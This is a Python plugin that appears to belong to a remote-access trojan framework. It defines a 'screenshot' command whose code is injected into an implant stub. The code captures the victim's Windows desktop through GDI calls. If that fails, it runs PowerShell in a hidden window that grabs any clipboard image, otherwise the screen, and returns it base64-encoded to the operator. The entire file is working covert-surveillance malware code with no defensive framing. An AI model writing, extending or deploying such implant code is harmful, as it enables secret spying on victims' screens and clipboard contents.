PLUGIN = {"name": "screenshot", "desc": "Desktop screenshot", "deps": [], "size": 0.7}

STUB_CODE = r"""
def _cmd_screenshot(m):
    try:
        if platform.system() != "Windows":
            return {"output": "[!] Screenshot requires Windows"}
        import ctypes, struct
        w = ctypes.windll.user32.GetSystemMetrics(0)
        h = ctypes.windll.user32.GetSystemMetrics(1)
        hdc_src = ctypes.windll.user32.GetDC(None)
        hdc_dst = ctypes.windll.gdi32.CreateCompatibleDC(hdc_src)
        hbmp = ctypes.windll.gdi32.CreateCompatibleBitmap(hdc_src, w, h)
        ctypes.windll.gdi32.SelectObject(hdc_dst, hbmp)
        ctypes.windll.gdi32.BitBlt(hdc_dst, 0, 0, w, h, hdc_src, 0, 0, 0x00CC0020)
        sz = w * h * 4
        bits = (ctypes.c_byte * sz)()
        class BIH(ctypes.Structure): _fields_ = [("s", ctypes.c_uint32),("w", ctypes.c_int32),("h", ctypes.c_int32),("p", ctypes.c_uint16),("b", ctypes.c_uint16),("c", ctypes.c_uint32),("s2", ctypes.c_uint32),("x", ctypes.c_int32),("y", ctypes.c_int32),("u", ctypes.c_uint32),("v", ctypes.c_uint32)]
        bih = BIH(40, w, h, 1, 32, 0, 0, 0, 0, 0, 0)
        ctypes.windll.gdi32.GetDIBits(hdc_dst, hbmp, 0, h, bits, ctypes.byref(bih), 0)
        ctypes.windll.user32.ReleaseDC(None, hdc_src); ctypes.windll.gdi32.DeleteDC(hdc_dst); ctypes.windll.gdi32.DeleteObject(hbmp)
        data = struct.pack("<HIHHI", 0x4D42, 54+sz, 0, 0, 54) + ctypes.string_at(ctypes.byref(bih), 40) + bytes(bits)
        return {"data": base64.b64encode(data).decode()}
    except Exception as e:
        try:
            import subprocess, base64
            ps = '''
Add-Type -AssemblyName System.Drawing,System.Windows.Forms
$bmp = [System.Windows.Forms.Clipboard]::GetImage()
if (-not $bmp) {
    $bmp = New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
    $g = [System.Drawing.Graphics]::FromImage($bmp)
    $g.CopyFromScreen(0,0,0,0,$bmp.Size)
    $g.Dispose()
}
$ms = New-Object System.IO.MemoryStream
$bmp.Save($ms,[System.Drawing.Imaging.ImageFormat]::Png)
[Convert]::ToBase64String($ms.ToArray())
$bmp.Dispose()
'''
            r = subprocess.run(["powershell","-NoP","-NonI","-Command",ps], capture_output=True, text=True, timeout=30, creationflags=0x08000000)
            if r.returncode == 0 and r.stdout.strip():
                return {"data": r.stdout.strip()}
            raise Exception(r.stderr[:200] if r.stderr else "PS failed")
        except Exception as e2:
            return {"output": f"[!] Screenshot failed: {e2}"}
_CMDS["screenshot"] = _cmd_screenshot
"""

def get_commands():
    return {"screenshot": "_cmd_screenshot"}
